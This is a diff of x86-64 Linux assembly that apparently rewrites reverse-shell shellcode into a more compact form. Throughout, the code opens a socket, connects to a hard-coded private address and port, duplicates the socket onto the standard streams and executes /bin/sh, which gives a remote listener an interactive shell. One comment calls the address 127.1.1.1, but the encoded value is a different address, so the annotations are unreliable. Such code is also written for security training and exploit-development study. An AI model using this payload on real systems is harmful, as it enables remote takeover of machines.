@@ -7,53 +7,51 @@ _start:
 	; socket(AF_INET, SOCK_STREAM, 0)
 	; (2, 1, 0)
 
-	xor rax, rax
-	mov rdx, rax
-	mov al, 41
-	mov rsi, rdx
-	inc rsi
-	mov rdi, rsi
-	inc rdi
+	xor rdx, rdx
+	lea rsi, [rdx + 1]
+	lea rdi, [rdx + 2]
+
+	push 0x29
+	pop rax ; SYS_socket
 
 	syscall
 
-
 	; connect(sockfd, &saddr, 0x10)
 	
-	mov rdi, rax
-	mov al, 42
-	push rdx
-	push rdx
-	mov byte [rsp], 0x2
-	mov word [rsp + 2], 0x3905 ; 1337
-	mov dword [rsp + 4], 0x4001a8c0 ; 192.168.1.64
+	xchg rdi, rax
+
+	push 0x4c01a8c0 ; IP Address: 127.1.1.1
+	push word 0x5c11
+	push ax
+
 	mov rsi, rsp
 	mov dl, 0x10
+
+	mov al, 0x2a ; SYS_connect
 
 	syscall
 
 	; dup2(clientfd, [0,1,2])
 	
-	xor rsi, rsi
+	xchg rsi, rdx
+	mov sil, 2
 	duplicate:
-		mov al, 33
+		mov al, 0x21 ; SYS_dup2
 		syscall
-		inc sil
-		cmp sil, 0x2
-		jle duplicate
+		dec sil
+		jns duplicate
 
 	; execve("/bin/sh", NULL, NULL)
-	
-	jmp binsh
 
-	shell:
-	mov al, 0x3b
 	xor rsi, rsi
-	xor rdx, rdx
-	pop rdi
+	push rsi
+	pop rdx
 
+	push rsi
+
+	mov rdi, 0x68732f2f6e69622f ; /bin//sh
+	push rdi
+	mov rdi, rsp
+
+	mov al, 0x3b ; SYS_execve
 	syscall
-
-	binsh:
-		call shell
-		db "/bin/sh"
